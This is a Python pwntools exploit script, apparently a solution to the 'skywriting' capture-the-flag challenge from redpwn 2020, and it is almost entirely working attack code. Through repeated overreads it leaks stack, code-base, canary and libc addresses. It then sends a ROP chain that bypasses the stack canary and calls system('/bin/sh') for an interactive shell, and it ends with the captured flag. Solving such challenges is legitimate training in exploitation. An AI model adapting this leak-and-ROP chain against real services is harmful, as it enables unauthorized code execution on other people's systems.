from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./skywriting')
	raw_input('debug')
	system_offset = 0x045390
	__libc_start_offet = 0x020740

else:
	host, port = '2020.redpwnc.tf', 31034
	r = remote(host, port)

system_call = 0xB4B
rop_rdi_call =  0xbd3 
rop_ret_call = 0x78e 
rop_rsi_call = 0x0000000000000bd1


r.sendlineafter('Hello there, do you want to write on the sky? ', '1')
# leak stack
buf= 'a'*52 + 'bcde'
r.sendafter('Is the answer intuitive yet? Give it your best shot: ', buf)
r.recvuntil('bcde')
res = r.recv(6)
leak = res + '\x00\x00'
stack = u64(leak)
log.info('stack = %#x' %stack)
buf_add = stack - 0xb0
log.info('buf_add = %#x ' %buf_add )
# binsh_add = stack + 0x30
binsh_add = stack - 0x78
log.info('binsh_add = %#x' %binsh_add)

stack2 = stack + 0xc8
log.info('%#x' %stack2)

# leak code address
buf2 = 'a'*84 + 'bcde'
r.sendafter('Try again, give it another shot: ', buf2)
r.recvuntil('bcde')
res = r.recv(6)
leak = res + '\x00\x00'
code_add = u64(leak) - 0xbbd
log.info('code_add = %#x' %code_add)
rop_rdi = code_add + rop_rdi_call
rop_ret = code_add + rop_ret_call
system_add = code_add + system_call
rop_rsi = code_add + rop_rsi_call
pop_r12_15_ret = 0x0000000000000bcc+code_add

# leak canary
buf3 = 'a'*133 + 'bcde'
r.sendafter('Try again, give it another shot: ', buf3)
r.recvuntil('bcde')
res = r.recv(7)
leak = '\x00' + res
canary = u64(leak)
log.info('canary = %#x' %canary)

# leak libc addres
buf4 = 'a'*148 + 'bcde'
r.sendafter('Try again, give it another shot: ', buf4)
r.recvuntil('bcde')
res = r.recv(6)
leak = res + '\x00\x00'
func_add = u64(leak) - 240
log.info('func_add = %#x' %func_add)
# libc_add = func_add - __libc_start_offet

#leak stack
r.recvuntil('shot: ')
payload = buf4.ljust(0xa8-3,'a') + '!!!'
r.send(payload)
r.recvuntil('!!!')
stack1 = u64(r.recv(6)+'\x00'*2)
log.info('stack1: 0x%x'%stack1)


# payload = 'notflag{a_cloud_is_just_someone_elses_computer}\n\x00'
# payload = payload.ljust(56, '\x00')
# payload = payload.ljust(128, 'b')
# payload += p64(canary)*2 + 'c'*8
# payload += p64(rop_rdi) + p64(stack1 - 0x40)
# payload += p64(pop_r12_15_ret) + p64(0x0)*4
# payload += p64(rop_ret) + p64(system_add)
# payload += '/bin/sh\x00'*0x10

# r.sendlineafter('Try again, give it another shot: ', payload)

payload = 'notflag{a_cloud_is_just_someone_elses_computer}\n\x00'
payload = payload.ljust(56, '\x00')
payload += '/bin/sh\x00'
payload = payload.ljust(136, 'b')
payload += p64(canary) + 'c'*8
payload += p64(rop_rdi) + p64(binsh_add)
payload += p64(pop_r12_15_ret) + p64(0x0)*4
payload += p64(rop_ret) + p64(system_add)
payload += '/bin/sh\x00'

r.sendlineafter('Try again, give it another shot: ', payload)

log.info(len(payload))

# payload2 = 'notflag{a_cloud_is_just_someone_elses_computer}\n'+'\x00'*8
# payload2 += '\x00'*(0x48)
# payload2 += p64(canary)*2
# payload2 += p64(rop_ret)
# payload2 += p64(rop_rdi)
# payload2 += p64(stack1)
# payload2 += p64(pop_r12_15_ret)
# payload2 += p64(0x0)*4
# payload2 += p64(rop_ret)
# payload2 += p64(system_add) #system@ Plt
# payload2 += '/bin/sh\x00'*((0x180- len(payload2))/8)
# r.recvuntil('shot: ')
# r.sendline(payload2)


r.interactive()
r.close()

#flag{a_cLOud_iS_jUSt_sOmeBodY_eLSes_cOMpUteR}